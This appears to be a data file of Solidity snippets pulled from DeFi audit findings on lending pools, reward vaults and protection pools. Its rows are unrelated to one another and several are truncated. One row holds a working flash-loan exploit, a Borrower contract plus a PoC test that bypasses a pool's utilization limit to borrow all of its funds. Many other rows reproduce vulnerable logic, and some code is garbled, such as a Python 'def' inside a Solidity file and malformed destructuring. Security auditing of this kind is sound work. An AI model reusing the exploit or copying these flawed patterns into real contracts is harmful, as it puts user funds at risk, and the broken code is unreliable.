pool.getDebtOf(pool.debtSharesBalanceOf(address(1)), pool.debtSharesSupply(), pool.lastTotalDebt());\n    assertEq(address1Debt, 1200);\n    assertEq(pool.lastTotalDebt(), 2399);\n\n    uint myCollateralBeforeLiquidate = collateralToken.balanceOf(address(this));\n\n    // liquidate 200 for Alice\n    loanToken.approve(address(pool), 200);\n    for (int i; i < 200; i++) {\n        pool.liquidate(address(1), 1);\n    }\n\n    // Alice's debt shares are NOT reduced"
"```\npragma solidity 0.8.17;\n\nimport { FlashBorrower, Flashloan, IERC20Token } from ""./FlashLoan.sol"";\nimport { Pool } from ""./../../src/Pool.sol"";\n\ncontract Borrower is FlashBorrower {\n    address public immutable owner;\n    Flashloan public immutable flashLoan;\n    Pool public immutable pool;\n    IERC20Token public loanToken;\n\n    constructor(Flashloan _flashLoan, Pool _pool) {\n        owner = msg.sender;\n        flashLoan = _flashLoan;\n        pool = _pool;\n        loanToken = IERC20Token(address(_pool.LOAN_TOKEN()));\n    }\n\n    function borrowAll() public returns (bool) {\n        pool.withdraw(0);\n        uint loanTokenBalance = loanToken.balanceOf(address(pool));\n        loanToken.approve(address(pool), loanTokenBalance);\n\n        flashLoan.execute(FlashBorrower(address(this)), loanToken, loanTokenBalance, abi.encode(loanTokenBalance));\n    }\n\n    function onFlashLoan(IERC20Token token, uint amount, bytes calldata data) public override {\n        (uint loanTokenBalance) = abi.decode(data, (uint));\n\n        pool.deposit(amount);\n        pool.borrow(loanTokenBalance);\n        pool.withdraw(amount);\n\n        token.transfer(address(flashLoan), amount);\n\n        loanToken.transfer(owner, loanTokenBalance);\n    }\n}\n```\n```\npragma solidity 0.8.17;\n\nimport ""forge-std/Test.sol"";\nimport ""../src/Pool.sol"";\nimport ""../src/Factory.sol"";\nimport ""./mocks/Borrower.sol"";\nimport ""./mocks/ERC20.sol"";\n\ncontract PoC is Test {\n    address public alice = vm.addr(0x1);\n    address public bob = vm.addr(0x2);\n    Factory public factory;\n    Pool public pool;\n    Borrower public borrower;\n    Flashloan public flashLoan;\n    MockERC20 public collateralToken;\n    MockERC20 public loanToken;\n    uint public maxCollateralRatioMantissa;\n    uint public surgeMantissa;\n    uint public collateralRatioFallDuration;\n    uint public collateralRatioRecoveryDuration;\n    uint public minRateMantissa;\n    uint public surgeRateMantissa;\n    uint public maxRateMantissa;\n\n    function setUp() public {\n        factory = new Factory(address(this), ""G"");\n        flashLoan = new Flashloan();\n        collateralToken = new MockERC20(1 ether, 18);\n        collateralToken.transfer(bob, 1 ether);\n        loanToken = new MockERC20(100 ether, 18);\n        loanToken.transfer(alice, 1 ether);\n        loanToken.transfer(address(flashLoan), 99 ether);\n        maxCollateralRatioMantissa = 1e18;\n        surgeMantissa = 0.8e18; // 80%\n        pool = factory.deploySurgePool(IERC20(address(collateralToken)), IERC20(address(loanToken)), maxCollateralRatioMantissa, surgeMantissa, 1e15, 1e15, 0.1e18, 0.4e18, 0.6e18);\n    }\n\n    function testFailBorrowAll() external {\n        vm.startPrank(alice);\n        loanToken.approve(address(pool), 1 ether);\n        pool.deposit(1 ether);\n        vm.stopPrank();\n\n        vm.startPrank(bob);\n        collateralToken.approve(address(pool), 1 ether);\n        pool.addCollateral(bob, 1 ether);\n        pool.borrow(1 ether);\n        vm.stopPrank();\n    }\n\n    function testBypassUtilizationRate() external {\n        uint balanceBefore = loanToken.balanceOf(bob);\n\n        vm.startPrank(alice);\n        loanToken.approve(address(pool), 1 ether);\n        pool.deposit(1"
```\n_supplied = 100\n_totalSupply = 100\n\n_interest = 10\nfee = 2\n```\n```\n_accuredFeeShares = (fee * _totalSupply) / supplied\n_accuredFeeShares = (2 * 100) / 100\n_accuredFeeShares = 2\n```\n```\n2 * 110 / 102 = 2.156\n```\n```\n_accuredFeeShares = (_totalSupply * fee) / (_supplied + _interest - fee)\n_accuredFeeShares = 2 * 100 / (100 + 10 - 2)\n_accuredFeeShares = 1.852\n\n1.852 * 110 / 101.852 = 2\n```
"```\nuint _timeDelta = block.timestamp - _lastAccrueInterestTime;\n\nif (_timeDelta == 0) {\n    return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n}\n\nuint _supplied = _totalDebt + _loanTokenBalance;\nuint _util = getUtilizationMantissa(_totalDebt, _supplied);\n\n_currentCollateralRatioMantissa = getCollateralRatioMantissa(\n    _util,\n    _lastAccrueInterestTime,\n    block.timestamp,\n    _lastCollateralRatioMantissa,\n    COLLATERAL_RATIO_FALL_DURATION,\n    COLLATERAL_RATIO_RECOVERY_DURATION,\n    MAX_COLLATERAL_RATIO_MANTISSA,\n    SURGE_MANTISSA\n);\n\nif (_totalDebt == 0) {\n    return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n}\n\nuint _borrowRate = getBorrowRateMantissa(_util, SURGE_MANTISSA, MIN_RATE, SURGE_RATE, MAX_RATE);\nuint _interest = _totalDebt * _borrowRate * _timeDelta / (365 days * 1e18);\n_currentTotalDebt += _interest;\n```"
```\nif (rewardDebtDiff > userRewardDebts[msg.sender][rewardToken.token]) {\n    userRewardDebts[msg.sender][rewardToken.token] = 0;\n    cachedUserRewards[msg.sender][rewardToken.token] += \n        rewardDebtDiff - \n        userRewardDebts[msg.sender][rewardToken.token];\n} else {\n    userRewardDebts[msg.sender][rewardToken.token] -= rewardDebtDiff;\n}\n```
"```\nfunction _withdrawUpdateRewardState(uint256 lpAmount_, bool claim_) internal {\n    uint256 numInternalRewardTokens = internalRewardTokens.length;\n    uint256 numExternalRewardTokens = externalRewardTokens.length;\n\n    uint256[] memory accumulatedInternalRewards = _accumulateInternalRewards();\n    uint256[] memory accumulatedExternalRewards = _accumulateExternalRewards();\n\n    for (uint256 i = 0; i < numInternalRewardTokens; i++) {\n        _updateInternalRewardState(i, accumulatedInternalRewards[i]);\n        if (claim_) _claimInternalRewards(i);\n\n        InternalRewardToken memory rewardToken = internalRewardTokens[i];\n        uint256 rewardDebtDiff = lpAmount_ * rewardToken.accumulatedRewardsPerShare;\n\n        if (rewardDebtDiff > userRewardDebts[msg.sender][rewardToken.token]) {\n            userRewardDebts[msg.sender][rewardToken.token] = 0;\n            cachedUserRewards[msg.sender][rewardToken.token] += rewardDebtDiff - userRewardDebts[msg.sender][rewardToken.token];\n        } else {\n            userRewardDebts[msg.sender][rewardToken.token] -= rewardDebtDiff;\n        }\n    }\n```"
```\nreturn (\n    amount_ * stethPerWsteth * stethUsd * decimalAdjustment\n) / (\n    ohmEth * ethUsd * 1e18\n)
"```\nohmMinted -= ohmReceived > ohmMinted? ohmMinted : ohmReceived;\nohmRemoved += ohmReceived > ohmMinted? ohmReceived - ohmMinted : 0;\n```\n```\nfunction _canDeposit(uint256 amount_) internal view virtual returns (bool) {\n    if (amount_ + ohmMinted > LIMIT + ohmRemoved) {\n        revert LiquidityVault_LimitViolation();\n    }\n    return true;\n}\n```\n```\nfunction getOhmEmissions() external view returns (uint256 emitted, uint256 removed) {\n    uint256 currentPoolOhmShare = _getPoolOhmShare();\n\n    if (ohmMinted > currentPoolOhmShare + ohmRemoved) {\n        emitted = ohmMinted - currentPoolOhmShare - ohmRemoved;\n    } else {\n        removed = currentPoolOhmShare + ohmRemoved - ohmMinted;\n    }\n}\n```"
"```\nfunction _accumulateInternalRewards() internal view returns (uint256[] memory) {\n    uint256 numInternalRewardTokens = internalRewardTokens.length;\n    uint256[] memory accumulatedInternalRewards = new uint256[](numInternalRewardTokens);\n\n    for (uint256 i = 0; i < numInternalRewardTokens; ) {\n        InternalRewardToken memory rewardToken = internalRewardTokens[i];\n\n        uint256 totalRewards;\n        if (totalLP > 0) {\n            uint256 timeDiff = block.timestamp - rewardToken.lastRewardTime;\n            totalRewards = (timeDiff * rewardToken.rewardsPerSecond);\n        }\n\n        accumulatedInternalRewards[i] = totalRewards;\n\n        unchecked {\n            i++;\n        }\n    }\n\n    return accumulatedInternalRewards;\n}\n```\nfunction addInternalRewardToken(\n    address token_,\n    uint256 rewardsPerSecond_,\n    uint256 startTimestamp_\n) external onlyRole(""liquidityvault_admin"") {\n    InternalRewardToken memory newInternalRewardToken = InternalRewardToken({\n        token: token_,\n        decimalsAdjustment: 10**ERC20(token_).decimals(),\n        rewardsPerSecond: rewardsPerSecond_,\n        lastRewardTime: block.timestamp > startTimestamp_? block.timestamp : startTimestamp_,\n        accumulatedRewardsPerShare: 0\n    });\n\n    internalRewardTokens.push(newInternalRewardToken);\n}\n```"
"```\nfunction _accumulateExternalRewards() internal override returns (uint256[] memory) {\n    uint256 numExternalRewards = externalRewardTokens.length;\n\n    auraPool.rewardsPool.getReward(address(this), true);\n\n    uint256[] memory rewards = new uint256[](numExternalRewards);\n    for (uint256 i = 0; i < numExternalRewards; i++) {\n        ExternalRewardToken storage rewardToken = externalRewardTokens[i];\n        uint256 newBalance = ERC20(rewardToken.token).balanceOf(address(this));\n\n        if (newBalance < rewardToken.lastBalance) {\n            emit LiquidityVault_ExternalAccumulationError(rewardToken.token);\n            continue;\n        }\n\n        rewards[i] = newBalance - rewardToken.lastBalance;\n        rewardToken.lastBalance = newBalance;\n    }\n    return rewards;\n}\n\nfunction _updateExternalRewardState(uint256 id_, uint256 amountAccumulated_) internal {\n    if (totalLP!= 0)\n        externalRewardTokens[id_].accumulatedRewardsPerShare +=\n            (amountAccumulated_ * 1e18) / totalLP;\n}\n```\n```\nfunction getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool) {\n    uint256 reward = earned(_account);\n    if (reward > 0) {\n        rewards[_account] = 0;\n        rewardToken.safeTransfer(_account, reward);\n        IDeposit(operator).rewardClaimed(pid, _account, reward);\n        emit RewardPaid(_account, reward);\n    }\n\n    if (_claimExtras) {\n        for (uint i = 0; i < extraRewards.length; i++) {\n            IRewards(extraRewards[i]).getReward(_account);\n        }\n    }\n    return true;\n}\n```\n```\nfunction claimFees() external onlyRole(""liquidityvault_admin"") {\n    uint256 numInternalRewardTokens = internalRewardTokens.length;\n    uint256 numExternalRewardTokens = externalRewardTokens.length;\n\n    for (uint256 i = 0; i < numInternalRewardTokens; ) {\n        address rewardToken = internalRewardTokens[i];\n        uint256 feeToSend = accumulatedFees[rewardToken];\n\n        accumulatedFees[rewardToken] = 0;\n\n        ERC20(rewardToken).safeTransfer(msg.sender, feeToSend);\n\n        unchecked {\n            i++;\n        }\n    }\n\n    for (uint256 i = 0; i < numExternalRewardTokens; ) {\n        ExternalRewardToken storage rewardToken = externalRewardTokens[i];\n        uint256 feeToSend = accumulatedFees[rewardToken.token];\n\n        accumulatedFees[rewardToken.token] = 0;\n\n        ERC20(rewardToken.token).safeTransfer(msg.sender, feeToSend);\n        rewardToken.lastBalance = ERC20(rewardToken.token).balanceOf(address(this));\n\n        unchecked {\n            i++;\n        }\n    }\n}\n```"
"```\nfunction _requestWithdrawal(uint256 _sTokenAmount) internal {\n    uint256 _sTokenBalance = balanceOf(msg.sender);\n    if (_sTokenAmount > _sTokenBalance) {\n        revert InsufficientSTokenBalance(msg.sender, _sTokenBalance);\n    }\n\n    uint256 _currentCycleIndex = poolCycleManager.getCurrentCycleIndex(address(this));\n\n    uint256 _withdrawalCycleIndex = _currentCycleIndex + 2;\n\n    WithdrawalCycleDetail storage withdrawalCycle = withdrawalCycleDetails[_withdrawalCycleIndex];\n\n    uint256 _oldRequestAmount = withdrawalCycle.withdrawalRequests[msg.sender];\n    withdrawalCycle.withdrawalRequests[msg.sender] = _sTokenAmount;\n\n    unchecked {\n        if (_oldRequestAmount > _sTokenAmount) {\n            withdrawalCycle.totalSTokenRequested -= (_oldRequestAmount - _sTokenAmount);\n        } else {\n            withdrawalCycle.totalSTokenRequested += (_sTokenAmount - _oldRequestAmount);\n        }\n    }\n\n    emit WithdrawalRequested(msg.sender, _sTokenAmount, _withdrawalCycleIndex);\n}\n```"
"```\nfunction _getLendingPoolStatus(address _lendingPoolAddress)\n    internal\n    view\n    returns (LendingPoolStatus)\n{\n    if (!_isReferenceLendingPoolAdded(_lendingPoolAddress)) {\n        return LendingPoolStatus.NotSupported;\n    }\n\n    ILendingProtocolAdapter _adapter = _getLendingProtocolAdapter(_lendingPoolAddress);\n\n    if (_adapter.isLendingPoolExpired(_lendingPoolAddress)) {\n        return LendingPoolStatus.Expired;\n    }\n\n    if (\n        _adapter.isLendingPoolLateWithinGracePeriod(\n            _lendingPoolAddress,\n            Constants.LATE_PAYMENT_GRACE_PERIOD_IN_DAYS\n        )\n    ) {\n        return LendingPoolStatus.LateWithinGracePeriod;\n    }\n\n    if (_adapter.isLendingPoolLate(_lendingPoolAddress)) {\n        return LendingPoolStatus.Late;\n    }\n\n    return LendingPoolStatus.Active;\n}"
"```\nfunction _verifyLendingPoolIsActive(\n    IDefaultStateManager defaultStateManager,\n    address _protectionPoolAddress,\n    address _lendingPoolAddress\n) internal view {\n    LendingPoolStatus poolStatus = defaultStateManager.getLendingPoolStatus(\n        _protectionPoolAddress,\n        _lendingPoolAddress\n    );\n\n    if (\n        poolStatus == LendingPoolStatus.LateWithinGracePeriod ||\n        poolStatus == LendingPoolStatus.Late\n    ) {\n        revert IProtectionPool.LendingPoolHasLatePayment(_lendingPoolAddress);\n    }\n}\n```"
"```\nfunction lockCapital(address _lendingPoolAddress)\n    external\n    payable\n    override\n    onlyDefaultStateManager\n    whenNotPaused\n    returns (uint256 _lockedAmount, uint256 _snapshotId)\n{\n    uint256 _length = activeProtectionIndexes.length();\n    for (uint256 i; i < _length; ) {\n        uint256 _remainingPrincipal = poolInfo.referenceLendingPools.calculateRemainingPrincipal(\n            _lendingPoolAddress,\n            protectionInfo.buyer,\n            protectionInfo.purchaseParams.nftLpTokenId\n        );\n```\n```\nfunction calculateRemainingPrincipal(\n    address _lendingPoolAddress,\n    address _lender,\n    uint256 _nftLpTokenId\n) public view override returns (uint256 _principalRemaining) {\n    if (_poolTokens.ownerOf(_nftLpTokenId) == _lender) {\n        IPoolTokens.TokenInfo memory _tokenInfo = _poolTokens.getTokenInfo(_nftLpTokenId);\n\n        if (_tokenInfo.pool == _lendingPoolAddress &&\n            _isJuniorTrancheId(_tokenInfo.tranche)) {\n            _principalRemaining = _tokenInfo.principalAmount -\n            _tokenInfo.principalRedeemed;\n        }\n    }\n}\n```\n```\ncontract PoolTokens is IPoolTokens, ERC721PresetMinterPauserAutoIdUpgradeSafe, HasAdmin, IERC2981 {\n  function burn(uint256 tokenId) external virtual override whenNotPaused {\n    TokenInfo memory token = _getTokenInfo(tokenId);\n    bool canBurn = _isApprovedOrOwner(_msgSender(), tokenId);\n    bool fromTokenPool = _validPool(_msgSender()) && token.pool == _msgSender();\n    address owner = ownerOf(tokenId);\n    require(canBurn || fromTokenPool, ""ERC721Burnable: caller cannot burn this token"");\n    require(token.principalRedeemed == token.principalAmount, ""Can only burn fully redeemed tokens"");\n    _destroyAndBurn(tokenId);\n    emit TokenBurned(owner, token.pool, tokenId);\n  }\n```\n```\ncontract ERC721UpgradeSafe is\n    Initializable,\n    ContextUpgradeSafe,\n    ERC165UpgradeSafe,\n    IERC721,\n    IERC721Metadata,\n    IERC721Enumerable\n{\n    function ownerOf(uint256 tokenId) public view override returns (address) {\n        return _tokenOwners.get(tokenId, ""ERC721: owner query for nonexistent token"");\n    }\n}"
"```\nfunction lockCapital(address _lendingPoolAddress)\n    external\n    payable\n    override\n    onlyDefaultStateManager\n    whenNotPaused\n    returns (uint256 _lockedAmount, uint256 _snapshotId)\n{\n    _snapshotId = _snapshot();\n\n    uint256 _length = lendingPoolDetails[_lendingPoolAddress].activeProtectionIndexes.length();\n    uint256 _lockedAmount = 0;\n\n    for (uint256 i = 0; i < _length; i++) {\n        uint256 _protectionIndex = lendingPoolDetails[_lendingPoolAddress].activeProtectionIndexes.at(i);\n        ProtectionInfo storage protectionInfo = protectionInfos[_protectionIndex];\n\n        uint256 _remainingPrincipal = poolInfo.referenceLendingPools.calculateRemainingPrincipal(\n            _lendingPoolAddress,\n            protectionInfo.buyer,\n            protectionInfo.purchaseParams.nftLpTokenId\n        );\n\n        uint256 _protectionAmount = protectionInfo.purchaseParams.protectionAmount;\n        uint256 _lockedAmountPerProtection = _protectionAmount < _remainingPrincipal\n           ? _protectionAmount\n            : _remainingPrincipal;\n\n        _lockedAmount += _lockedAmountPerProtection;\n    }\n\n    if (totalSTokenUnderlying < _lockedAmount) {\n        _lockedAmount = totalSTokenUnderlying;\n        totalSTokenUnderlying = 0;\n    } else {\n        totalSTokenUnderlying -= _lockedAmount;\n    }\n\n    return (_lockedAmount, _snapshotId);\n}"
"```\nif (\n  RiskFactorCalculator.canCalculateRiskFactor(\n    _totalCapital,\n    _leverageRatio,\n    _poolParameters.leverageRatioFloor,\n    _poolParameters.leverageRatioCeiling,\n    _poolParameters.minRequiredCapital\n  ) {\n  // rest of code\n} else {\n  _isMinPremium = true;\n}\n```\n```\nfunction canCalculateRiskFactor(\n    uint256 _totalCapital,\n    uint256 _leverageRatio,\n    uint256 _leverageRatioFloor,\n    uint256 _leverageRatioCeiling,\n    uint256 _minRequiredCapital\n) external pure returns (bool _canCalculate) {\n    if (\n        _totalCapital < _minRequiredCapital ||\n        _leverageRatio < _leverageRatioFloor ||\n        _leverageRatio > _leverageRatioCeiling\n    ) {\n        _canCalculate = false;\n    } else {\n        _canCalculate = true;\n    }\n}\n```"
"```\nFile: ProtectionPool.sol\n\nfunction _snapshot() internal returns (uint256) {\n    /// step 1: Capture protection pool's current investors by creating a snapshot of the token balance by using ERC20Snapshot in SToken\n    _snapshotId = _snapshot();\n}\n```\n```\nFile: DefaultStateManager.sol\n\ndef _claimableUnlockedCapital(\n    _seller,\n    _snapshotId\n):\n    _claimableUnlockedCapital = (\n        _poolSToken.balanceOfAt(_seller, _snapshotId) *\n        lockedCapital.amount\n    ) / _poolSToken.totalSupplyAt(_snapshotId)\n```"
"```\nfunction deposit(uint256 _underlyingAmount, address _receiver)\n    external\n    override\n    whenNotPaused\n    nonReentrant\n{\n    _deposit(_underlyingAmount, _receiver);\n}\n\nfunction _deposit(uint256 _underlyingAmount, address _receiver) internal {\n    if (poolInfo.currentPhase == ProtectionPoolPhase.OpenToBuyers) {\n        revert ProtectionPoolInOpenToBuyersPhase();\n    }\n\n    uint256 _sTokenShares = convertToSToken(_underlyingAmount);\n    totalSTokenUnderlying += _underlyingAmount;\n    _safeMint(_receiver, _sTokenShares);\n    poolInfo.underlyingToken.safeTransferFrom(\n        msg.sender,\n        address(this),\n        _underlyingAmount\n    );\n\n    if (_hasMinRequiredCapital()) {\n        uint256 _leverageRatio = calculateLeverageRatio();\n\n        if (_leverageRatio > poolInfo.params.leverageRatioCeiling) {\n            revert ProtectionPoolLeverageRatioTooHigh(_leverageRatio);\n        }\n    }\n\n    emit ProtectionSold(_receiver, _underlyingAmount);\n}\n```"
"```\nfunction mint(uint256 pid, uint256 amount)\n    external\n    nonReentrant\n    returns (uint256)\n{\n    address lpToken = ichiFarm.lpToken(pid);\n    IERC20Upgradeable(lpToken).safeTransferFrom(\n        msg.sender,\n        address(this),\n        amount\n    );\n\n    if (\n        IERC20Upgradeable(lpToken).allowance(\n            address(this),\n            address(ichiFarm)\n        )!= type(uint256).max\n    ) {\n        IERC20Upgradeable(lpToken).safeApprove(\n            address(ichiFarm),\n            type(uint256).max\n        );\n    }\n\n    ichiFarm.deposit(pid, amount, address(this));\n    uint256 ichiPerShare,, ) = ichiFarm.poolInfo(pid);\n    uint256 id = encodeId(pid, ichiPerShare);\n    _mint(msg.sender, id, amount, """");\n    return id;\n}\n```\n```\nfunction burn(uint256 id, uint256 amount)\n    external\n    nonReentrant\n    returns (uint256)\n{\n    if (amount == type(uint256).max) {\n        amount = balanceOf(msg.sender, id);\n    }\n    (\n        uint256 pid,\n        uint256 stIchiPerShare\n    ) = decodeId(id);\n    _burn(msg.sender, id, amount);\n\n    uint256 ichiRewards = ichiFarm.pendingIchi(pid, address(this));\n    ichiFarm.harvest(pid, address(this));\n    ichiFarm.withdraw(pid, amount, address(this));\n\n    if (ichiRewards > 0) {\n        ICHIv1.safeApprove(address(ICHI), ichiRewards);\n        ICHI.convertToV2(ichiRewards);\n    }\n\n    address lpToken = ichiFarm.lpToken(pid);\n    IERC20Upgradeable(lpToken).safeTransfer(msg.sender, amount);\n\n    (\n        uint256 enIchiPerShare,\n       ,\n       ,\n    ) = ichiFarm.poolInfo(pid);\n    uint256 stIchi = (stIchiPerShare * amount).divCeil(1e18);\n    uint256 enIchi = (enIchiPerShare * amount) / 1e18;\n\n    if (enIchi > stIchi) {\n        ICHI.safeTransfer(msg.sender, enIchi - stIchi);\n    }\n    return pid;\n}\n```\n```\ndoRefund(ICI)\n```"
"```\ndoTakeCollateral(\n    strategies[strategyId].vault,\n    lpTakeAmt\n)\n```\nuint256 amtLPToRemove = vault.balanceOf(address(this)) - amountLpWithdraw;\nvault.withdraw(amtLPToRemove, address(this));\n```\n```\ndoWithdraw(collToken, amountShareWithdraw)\n```\n```\ndoRepay(borrowToken, amountRepay)\n```\n```\n_validateMaxLTV(strategyId)\n```\n```\ndoRefund(borrowToken);\ndoRefund(collToken);\n```"
"```\nfunction _validateMaxLTV(uint256 strategyId) internal view {\n    uint256 debtValue = bank.getDebtValue(bank.POSITION_ID());\n\n    (, address collToken, uint256 collAmount,,,,, ) = bank.getCurrentPositionInfo();\n\n    uint256 collPrice = bank.oracle().getPrice(collToken);\n    uint256 collValue = (collPrice * collAmount) / 10**IERC20Metadata(collToken).decimals();\n\n    if (debtValue > (collValue * maxLTV[strategyId][collToken]) / DENOMINATOR) {\n        revert EXCEED_MAX_LTV();\n    }\n}\n```\n```\nfunction reducePosition(\n    uint256 strategyId,\n    address collToken,\n    uint256 collAmount\n) external {\n    doWithdraw(collToken, collAmount);\n    doRefund(collToken);\n    _validateMaxLTV(strategyId);\n}\n```"
"```\n((borrowsValue - collateralValue) / underlyingValue) >= underlyingLiqThreshold\n```\n```\nuint256 cv = oracle.getUnderlyingValue(\n    pos.underlyingToken,\n    pos.underlyingAmount\n);"
```\nwAmount = wAmount > pos.underlyingAmount\n   ? pos.underlyingAmount\n    : wAmount;\n\npos.underlyingVaultShare -= shareAmount;\npos.underlyingAmount -= wAmount;\nbank.totalLend -= wAmount;\n```
"```\nif (\n    block.timestamp <\n    config.withdrawVaultFeeWindowStartTime() +\n        config.withdrawVaultFeeWindow()\n) {\n    uint256 fee = (withdrawAmount * config.withdrawVaultFee()) / DENOMINATOR;\n    uToken.safeTransfer(config.treasury(), fee);\n    withdrawAmount -= fee;\n}\n```\n```\nuint256 wAmount;\n\nif (address(ISoftVault(bank.softVault).uToken()) == token) {\n    ISoftVault(bank.softVault).approve(\n        bank.softVault,\n        type(uint256).max\n    );\n    wAmount = ISoftVault(bank.softVault).withdraw(shareAmount);\n} else {\n    wAmount = IHardVault(bank.hardVault).withdraw(token, shareAmount);\n}\n\nwAmount = wAmount > pos.underlyingAmount\n   ? pos.underlyingAmount\n    : wAmount;\n\npos.underlyingVaultShare -= shareAmount;\npos.underlyingAmount -= wAmount;\nbank.totalLend -= wAmount;\n```\n```\nuint256 cv = oracle.getUnderlyingValue(\n    pos.underlyingToken,\n    pos.underlyingAmount\n);"
"```\nfunction _amountsForLiquidity(\n    int24 tickLower,\n    int24 tickUpper,\n    uint128 liquidity\n) internal view returns (uint256, uint256) {\n    (uint160 sqrtRatioX96,,,,,, ) = IUniswapV3Pool(pool).slot0();\n    return (\n        UV3Math.getAmountsForLiquidity(\n            sqrtRatioX96,\n            UV3Math.getSqrtRatioAtTick(tickLower),\n            UV3Math.getSqrtRatioAtTick(tickUpper),\n            liquidity\n        )\n    );\n}\n```"
```\nSTATICCALL IchiLpOracle.getPrice(token=0xFCFE742e19790Dd67a627875ef8b45F17DB1DaC6) => (\n    1101189125194558706411110851447\n)
"```\nbank.totalLend += amount;\n```\nuint256 liqSize = (pos.collateralSize * share) / oldShare;\nuint256 uTokenSize = (pos.underlyingAmount * share) / oldShare;\nuint256 uVaultShare = (pos.underlyingVaultShare * share) / oldShare;\n\npos.collateralSize -= liqSize;\npos.underlyingAmount -= uTokenSize;\npos.underlyingVaultShare -= uVaultShare;\n```\n```\nfunction withdraw(uint256 shareAmount)\n    external\n    override\n    nonReentrant\n    returns (uint256 withdrawAmount)\n{\n    if (shareAmount == 0) revert ZERO_AMOUNT();\n\n    _burn(msg.sender, shareAmount);\n\n    uint256 uBalanceBefore = uToken.balanceOf(address(this));\n    if (cToken.redeem(shareAmount)!= 0) revert REDEEM_FAILED(shareAmount);\n    uint256 uBalanceAfter = uToken.balanceOf(address(this));\n\n    withdrawAmount = uBalanceAfter - uBalanceBefore;\n\n    if (\n        block.timestamp <\n        config.withdrawVaultFeeWindowStartTime() +\n        config.withdrawVaultFeeWindow()\n    ) {\n        uint256 fee = (withdrawAmount * config.withdrawVaultFee()) / DENOMINATOR;\n        uToken.safeTransfer(config.treasury(), fee);\n        withdrawAmount -= fee;\n    }\n\n    uToken.safeTransfer(msg.sender, withdrawAmount);\n\n    emit Withdrawn(msg.sender, withdrawAmount, shareAmount);\n}\n```"
"```\nfunction doERC20TransferIn(address token, uint256 amountCall)\n    internal\n    returns (uint256)\n{\n    uint256 balanceBefore = IERC20Upgradeable(token).balanceOf(address(this));\n    IERC20Upgradeable(token).safeTransferFrom(\n        msg.sender,\n        address(this),\n        amountCall\n    );\n    uint256 balanceAfter = IERC20Upgradeable(token).balanceOf(address(this));\n    return balanceAfter - balanceBefore;\n}\n```\n```\nif (amountCall == type(uint256).max):\n    amountCall = oldDebt\n```"
"```\n/**\n * @notice Deposit underlying assets on Compound and issue share token\n * @param amount Underlying token amount to deposit\n * @return shareAmount cToken amount\n */\nfunction deposit(address token, uint256 amount) {\n    // rest of code\n}\n\n/**\n * @notice Withdraw underlying assets from Compound\n * @param shareAmount Amount of cTokens to redeem\n * @return withdrawAmount Amount of underlying assets withdrawn\n */\nfunction withdraw(address token, uint256 shareAmount) {\n    // rest of code\n}\n```"
"```\nif (amountToSwap > 0) {\n    swapPool = IUniswapV3Pool(vault.pool());\n    swapPool.swap(\n        address(this),\n       !isTokenA,\n        int256(amountToSwap),\n        isTokenA\n           ? UniV3WrappedLibMockup.MAX_SQRT_RATIO - 1\n            : UniV3WrappedLibMockup.MIN_SQRT_RATIO + 1,\n        abi.encode(address(this))\n    );\n}\n```\n```\nfunction uniswapV3SwapCallback(\n    int256 amount0Delta,\n    int256 amount1Delta,\n    bytes calldata data\n) external override {\n    if (msg.sender!= address(swapPool)) {\n        revert NOT_FROM_UNIV3(msg.sender);\n    }\n    address payer = abi.decode(data, (address));\n\n    if (amount0Delta > 0) {\n        if (payer == address(this)) {\n            IERC20Upgradeable(swapPool.token0()).safeTransfer(\n                msg.sender,\n                uint256(amount0Delta)\n            );\n        } else {\n            IERC20Upgradeable(swapPool.token0()).safeTransferFrom(\n                payer,\n                msg.sender,\n                uint256(amount0Delta)\n            );\n        }\n    } else if (amount1Delta > 0) {\n        if (payer == address(this)) {\n            IERC20Upgradeable(swapPool.token1()).safeTransfer(\n                msg.sender,\n                uint256(amount1Delta)\n            );\n        } else {\n            IERC20Upgradeable(swapPool.token1()).safeTransferFrom(\n                payer,\n                msg.sender,\n                uint256(amount1Delta)\n            );\n        }\n    }\n}"
"```\nfunction doCutRewardsFee(address token) internal {\n    if (bank.config().treasury() == address(0)) {\n        revert NO_TREASURY_SET();\n    }\n\n    uint256 balance = IERC20Upgradeable(token).balanceOf(address(this));\n    if (balance > 0) {\n        uint256 fee = (balance * bank.config().depositFee()) / DENOMINATOR;\n        IERC20Upgradeable(token).safeTransfer(\n            bank.config().treasury(),\n            fee\n        );\n\n        balance -= fee;\n        IERC20Upgradeable(token).safeTransfer(bank.EXECUTOR(), balance);\n    }\n}"
"```\nfunction latestRoundData(\n  address base,\n  address quote\n)\n  external\n  view\n  override\n  returns (\n    uint80 roundId,\n    int256 answer,\n    uint256 startedAt,\n    uint256 updatedAt,\n    uint80 answeredInRound\n  ) {\n  uint16 currentPhaseId = s_currentPhaseId[base][quote];\n  AggregatorV2V3Interface aggregator = _getFeed(base, quote);\n  require(address(aggregator)!= address(0), ""Feed not found"");\n  (\n    roundId,\n    answer,\n    startedAt,\n    updatedAt,\n    answeredInRound\n  ) = aggregator.latestRoundData();\n  return _addPhaseIds(roundId, answer, startedAt, updatedAt, answeredInRound, currentPhaseId);\n}\n```"
"```\nfunction transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n    _transfer(sender, recipient, amount);\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, ""ERC20: transfer amount exceeds allowance""));\n    return true;\n}\n```\n```\nif (\n    IERC20Upgradeable(lpToken).allowance(\n        address(this),\n        address(ichiFarm)\n    )!= type(uint256).max\n) {\n    IERC20Upgradeable(lpToken).safeApprove(\n        address(ichiFarm),\n        type(uint256).max\n    );\n}\n```\n```\nfunction safeApprove(\n    IERC20Upgradeable token,\n    address spender,\n    uint256 value\n) internal {\n    require(\n        (value == 0) || (token.allowance(address(this), spender) == 0),\n        ""SafeERC20: approve from non-zero to non-zero allowance""\n    );\n    _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n}\n```"
